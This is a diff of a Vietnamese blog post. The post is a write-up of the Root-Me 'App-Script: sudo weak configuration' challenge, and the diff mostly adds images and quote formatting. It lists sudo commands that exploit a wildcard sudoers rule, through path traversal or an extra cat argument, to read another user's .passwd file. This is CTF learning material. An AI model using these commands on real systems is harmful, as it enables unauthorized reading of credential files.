@@ -1,7 +1,7 @@
 ---
 layout: post
 published: true
-title: "root-me-App-Script"
+title: root-me-App-Script
 date: '2018-07-25'
 subtitle: 'App-Script: sudo — weak configuration'
 ---
@@ -21,24 +21,28 @@ Truy cập vào /ch1cracked để kiểm tra thử xem sao. Bài này liên quan
 sudo -l (trong tài liệu của root-me cung cấp)
 Khi được yêu cầu nhập mật khẩu, ta nhập mật khẩu của user, không phải root password.
 
-
+![](https://cdn-images-1.medium.com/max/1200/1*yexziu4liV2SdwKN7wi00Q.png)
 Từ kết quả, user app-script-ch1 có thể dùng những câu lệnh trên challenge02:
 
 (app-script-ch1-cracked) /bin/cat /challenge/app-script/ch1/ch1/*
 
 Theo mình hiểu được thì có thể chạy dưới “bí danh” app-script-ch1-cracked, thực hiện lệnh cat đối với đường dẫn /challenge/app-script/ch1/ch1/* (* nghĩa là tất cả trường hợp)
 
+![sudo -u](https://cdn-images-1.medium.com/max/800/1*Xd3sXqssH6fQyiB_dhvyaw.png)
 
-sudo -u
 Theo những gì hiểu được và 1 hồi mày mò thì đã ra được đáp án đúng:
 
-sudo -u app-script-ch1-cracked cat /challenge/app-script/ch1/ch1/*/../ch1cracked/.passwd
+> sudo -u app-script-ch1-cracked cat /challenge/app-script/ch1/ch1/*/../ch1cracked/.passwd
 
 Hoặc có thể dùng câu lệnh khác, ví dụ như:
 
-sudo -u app-script-ch1-cracked cat /challenge/app-script/ch1/ch1/shared_notes /challenge/app-script/ch1/ch1cracked/.passwd
+> sudo -u app-script-ch1-cracked cat /challenge/app-script/ch1/ch1/shared_notes /challenge/app-script/ch1/ch1cracked/.passwd
 
 Lợi dụng việc cat có thể mở một lúc nhiều file, ở câu lệnh trên ta mở file:
 
-/challenge/app-script/ch1/ch1/shared_notes
-Đây là đường dẫn giống như là “khử” điều kiện của /challenge/app-script/ch1/ch1/* ((app-script-ch1-cracked) /bin/cat /challenge/app-script/ch1/ch1/*), và đường dẫn sau chính là đường dẫn mình cần phải mở sau khi điều kiện sudo đã thỏa.
+> /challenge/app-script/ch1/ch1/shared_notes
+
+Đây là đường dẫn giống như là “khử” điều kiện của /challenge/app-script/ch1/ch1/* ((app-script-ch1-cracked) 
+> /bin/cat /challenge/app-script/ch1/ch1/*)  
+
+và đường dẫn sau chính là đường dẫn mình cần phải mở sau khi điều kiện sudo đã thỏa.
